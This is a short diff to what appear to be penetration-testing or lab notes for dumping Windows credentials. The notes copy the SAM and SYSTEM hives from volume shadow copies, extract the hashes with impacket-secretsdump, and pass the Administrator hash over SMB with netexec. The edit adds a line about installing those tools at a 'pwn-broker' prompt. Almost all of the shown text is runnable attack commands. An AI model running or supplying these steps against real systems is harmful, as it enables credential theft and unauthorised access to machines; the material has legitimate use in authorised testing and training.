@@ -35,7 +35,7 @@ icacls C:\Windows\System32\config\SAM
 From cmd.exe, shadow copy 1 first, then 2 and up until one is found:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\Public\sam.hive
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\system.hive
-Both, sent back into loot/, on Kali:
+Both, sent back into loot/, on Kali. At the pwn-broker prompt: tool install impacket and tool install netexec.
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 nxc smb <TargetIP> -u Administrator -H <Hash> --local-auth
 
